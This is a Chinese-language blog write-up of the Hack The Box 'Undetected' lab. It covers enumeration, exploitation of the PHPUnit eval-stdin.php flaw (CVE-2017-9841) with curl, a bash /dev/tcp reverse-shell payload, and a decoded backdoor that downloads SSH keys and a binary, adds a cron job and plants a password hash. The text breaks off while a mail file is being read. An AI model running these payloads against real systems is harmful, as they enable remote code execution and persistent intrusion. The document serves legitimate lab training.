@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Undetected - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Undetected靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-24 21:25 EST Nmap sca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Undetected - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Undetected靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-02-24 21:25 EST Nmap sca">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/1e25e841-82de-4cf8-8454-30c628f3334c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/c13bdf59-bb66-444b-b145-555f89b6c9d9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/86027939-0731-489d-935c-d16b463ca98c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/654e0785-e6e1-4e68-bc54-0eaf211df8c4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/2461efa9-d2e5-4087-9d6a-c204719d124e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/2042b883-e106-40d4-8a66-80c327edc8cd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/9f9d4342-d311-4a93-bd1a-d3362669c6a6.png">
+<meta property="article:published_time" content="2022-02-25T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:54:15.919Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/1e25e841-82de-4cf8-8454-30c628f3334c.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Undetected - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Undetected - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-02-25T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-02-25
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Undetected"><span class="post-toc-text">Hackthebox - Undetected</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Exploit"><span class="post-toc-text">Exploit</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell"><span class="post-toc-text">Shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-Undetected"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Undetected - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-02-25 19:38:36" datetime="2022-02-25T11:38:36.000Z"  itemprop="datePublished">2022-02-25</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Undetected"><a href="#Hackthebox-Undetected" class="headerlink" title="Hackthebox - Undetected"></a>Hackthebox - Undetected</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/1e25e841-82de-4cf8-8454-30c628f3334c.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/c13bdf59-bb66-444b-b145-555f89b6c9d9.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.146
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-24 21:25 EST
+Nmap scan report for 10.10.11.146
+Host is up (0.23s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
+|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
+|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Diana&#39;s Jewelry
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/24%OT=22%CT=1%CU=42918%PV=Y%DS=2%DC=T%G=Y%TM=62183E4
+OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=C)SEQ
+OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505
+OS:ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=
+OS:M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=
+OS:Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q
+OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%
+OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
+OS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL
+OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT       ADDRESS
+1   222.46 ms 10.10.14.1
+2   222.61 ms 10.10.11.146
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.48 seconds
+</code></pre>
+<p>nmap扫描后只看到22和80，那就去看看80端口吧</p>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/86027939-0731-489d-935c-d16b463ca98c.png" class>
+
+<p>这看着像是一家珠宝店的官网，先在网站上到处看看有没有啥可以利用的东西吧</p>
+<p>点击STORE会跳转到store.djewelry.htb，加入hosts再看看</p>
+<pre><code class="bash">echo 10.10.11.146 djewelry.htb store.djewelry.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/654e0785-e6e1-4e68-bc54-0eaf211df8c4.png" class>
+
+<p>进来以后是一个商城页面，到处看看功能点</p>
+<img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/2461efa9-d2e5-4087-9d6a-c204719d124e.png" class>
+
+<p>这里提示网站已搬迁，去做个FUZZ看看</p>
+<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://store.djewelry.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://store.djewelry.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+js                      [Status: 301, Size: 321, Words: 20, Lines: 10]
+images                  [Status: 301, Size: 325, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 322, Words: 20, Lines: 10]
+fonts                   [Status: 301, Size: 324, Words: 20, Lines: 10]
+vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]
+                        [Status: 200, Size: 6215, Words: 528, Lines: 196]
+:: Progress: [20116/20116] :: Job [1/1] :: 106 req/sec :: Duration: [0:03:03] :: Errors: 0 ::
+</code></pre>
+<p>挨个查看一下</p>
+<img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/2042b883-e106-40d4-8a66-80c327edc8cd.png" class>
+
+<p>在vendor里有不少东西，有点意思</p>
+<img src="/2022/02/25/Hackthebox/Medium/Hackthebox-Undetected/9f9d4342-d311-4a93-bd1a-d3362669c6a6.png" class>
+
+<p>&#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F;</p>
+<p>在这个路径中可以看到版本更新记录，最后一个版本是5.6，查看一下ChangeLog-5.6.md</p>
+<pre><code class="bash"># Changes in PHPUnit 5.6
+
+All notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles.
+
+## [5.6.2] - 2016-10-25
+
+New PHAR release due to updated dependencies
+
+## [5.6.1] - 2016-10-07
+
+### Fixed
+
+* Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()`
+
+## [5.6.0] - 2016-10-07
+
+### Added
+
+* Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case&#39;s data set (for use in `setUp()`, for instance)
+* Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions
+* Added `PHPUnit\Framework\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith
+* Added the `@doesNotPerformAssertions` annotation for excluding a test from the &quot;useless test&quot; risky test check
+
+### Changed
+
+* Deprecated `PHPUnit\Framework\TestCase::setExpectedExceptionRegExp()`
+* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`
+
+[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2
+[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1
+[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0
+</code></pre>
+<p>这边给出了一个更新时间，最后一次是在2016-10-25，那咱们看看PHPUnit在这个时间之后的漏洞就可以了</p>
+
+
+<p>这边搜索后可以看到有一个CVE-2017-9841是符合我们的条件的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><pre><code class="bash">http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+</code></pre>
+<blockquote>
+<p><a href="https://www.cvedetails.com/cve/CVE-2017-9841/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2017-9841/</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md</a></p>
+</blockquote>
+<p>根据上面对该漏洞的描述，在vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php处进行利用，咱们抓个包进行一次尝试</p>
+
+
+<p>在下方加入然后放包执行</p>
+
+
+<p>成功被执行了</p>
+<p>现在咱们来想办法构造一下命令</p>
+<pre><code class="bash">GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Host: store.djewelry.htb
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 24
+
+&lt;?php system(&quot;whoami&quot;)?&gt;
+</code></pre>
+
+
+<p>成功执行命令，但是有点麻烦，用curl看看能不能成功吧</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data &quot;&lt;?php system(&#39;whoami&#39;)?&gt;&quot;
+www-data
+</code></pre>
+<p>OK，成功执行命令，那么现在来构造poc回弹shell吧</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>使用nc监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<pre><code class="bash">&lt;?php system(&#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.24/4444 0&gt;&amp;1&quot;&#39;)?&gt;
+</code></pre>
+<p>在burp里执行即可获得shell</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.24] from (UNKNOWN) [10.10.11.146] 56644
+bash: cannot set terminal process group (865): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+&lt;HP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;                    
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id
+&lt;ore/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id                    
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功拿到一个shell</p>
+<pre><code class="bash">Ctrl+Z返回
+stty raw -echo; fg
+export TERM=xterm
+stty rows 51 cols 237
+</code></pre>
+<p>修复一下shell</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><pre><code class="bash">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep &#39;bash&#39; /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+</code></pre>
+<p>咱们的提权目标就在steven和steven1这两个用户上了</p>
+<pre><code class="bash">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home
+www-data@production:/home$ ls
+steven
+www-data@production:/home$ cd steven
+bash: cd: steven: Permission denied
+www-data@production:/home$ ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Feb  8 19:59 .
+drwxr-xr-x 19 root   root   4096 Feb  8 19:59 ..
+drwxr-x---  5 steven steven 4096 Feb  8 19:59 steven
+</code></pre>
+<p>没有权限进入steven用户目录，这里暂时没有思路了，跑一个Linpeas看看</p>
+<p>linpeas跑出来的结果比较多，就不全贴出来了，其中看到一个</p>
+<p>&#x2F;var&#x2F;backups&#x2F;info存在一个这个文件，并且还是www-data权限的，去看看</p>
+<pre><code class="bash">www-data@production:/var/backups$ ls -la
+total 72
+drwxr-xr-x  2 root     root      4096 Feb 24 23:49 .
+drwxr-xr-x 13 root     root      4096 Feb  8 19:59 ..
+-rw-r--r--  1 root     root     34011 Feb  8 19:05 apt.extended_states.0
+-r-x------  1 www-data www-data 27296 May 14  2021 info
+www-data@production:/var/backups$ file info 
+info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
+</code></pre>
+<p>这是一个二进制文件，查看一下</p>
+<pre><code class="bash">776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
+</code></pre>
+<p>在一大堆乱码中找到了这么一串十六进制字符</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# echo &quot;776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&quot; | xxd -r -p
+wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &quot;* 3 * * * root /var/lib/.main&quot; &gt;&gt; /etc/crontab; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&quot;)}&#39; /etc/passwd; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &gt; users.txt&quot;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &quot;$user&quot;1&quot;:x:$group:$group:,,,:$home:$shell&quot; &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;
+</code></pre>
+<p>我们将它转为ASCII格式</p>
+<p>提取出这么一串hash，然后稍微修改一下</p>
+<pre><code class="bash">$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
+</code></pre>
+<p>然后再读取中知道了这一串应该是setven1的密码，去使用john爆破一下试试</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+ihatehackers     (?)
+1g 0:00:00:55 DONE (2022-02-25 01:39) 0.01789g/s 1594p/s 1594c/s 1594C/s jojo95..halo03
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>得到了setven1的密码</p>
+<pre><code class="bash">username = steven1
+password = ihatehackers
+</code></pre>
+<p>使用ssh进行连接</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh steven1@10.10.11.146
+steven1@10.10.11.146&#39;s password: 
+steven@production:~$ whoami&amp;&amp;id
+steven
+uid=1000(steven) gid=1000(steven) groups=1000(steven)
+</code></pre>
+<p>成功获得user权限</p>
+<pre><code class="bash">steven@production:~$ ls
+user.txt
+steven@production:~$ cat user.txt 
+e27e4aba73ab8ba7421550905082163e
+</code></pre>
+<p>成功获得user权限的flag文件</p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>sudo -l提示失败，那就跑个linpeas.sh看看情况吧</p>
+<pre><code class="bash">[+] Mails (limit 50)
+    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven                                                                                                                            
+    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven
+</code></pre>
+<p>看到两个关于邮件的信息，查看一下</p>
+<pre><code class="bash">steven@production:~$ cat /var/mail/steven
+From root@production  Sun, 25 Jul 2021 10:31:12 GMT
+Return-Path: &lt;root@production&gt;
+Received: from production (localhost [127.0.0.1])
+        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
